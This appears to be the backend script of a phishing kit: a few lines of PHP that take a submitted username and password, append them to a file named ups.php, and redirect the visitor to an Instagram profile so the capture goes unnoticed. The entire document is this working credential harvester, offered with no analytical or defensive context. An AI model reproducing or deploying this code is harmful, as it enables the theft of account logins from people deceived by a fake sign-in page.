<?

$Login = $_POST[zabor]; // login

$Pass = $_POST['zena']; //pass

$log = fopen("ups.php","a+"); //location

fwrite($log,"<br> $Login:$Pass \n"); // ups.php

fclose($log); //

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.instagram.com/imdew1990/'></head></html>"; // 

?>